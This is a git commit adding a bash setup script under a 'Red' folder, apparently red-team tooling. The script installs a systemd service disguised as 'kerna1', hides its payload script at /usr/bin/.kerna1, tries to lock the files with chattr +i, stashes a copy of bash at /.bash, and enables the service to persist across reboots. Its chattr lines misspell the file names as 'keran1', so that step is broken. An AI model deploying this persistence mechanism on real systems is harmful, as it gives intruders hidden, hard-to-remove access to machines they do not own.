0c4f8eac937887de04961cf27926a2fb54548b9f
sh1dow3r <sh1dow3r@gmail.com>
2019-10-05 17:11:05 -0400

    adding new setup

---
+++ Red/custom_service/setup.sh
@@ -0,0 +1,15 @@
+#!/bin/bash
+
+cp ./kerna1.service /lib/systemd/system/kerna1.service
+
+cp ./kerna1.sh /usr/bin/.kerna1
+
+chattr +i /lib/systemd/system/keran1.service
+
+chattr +i /usr/bin/.keran1
+
+cp /usr/bin/bash /.bash
+
+
+systemctl start kerna1
+systemctl enable kerna1
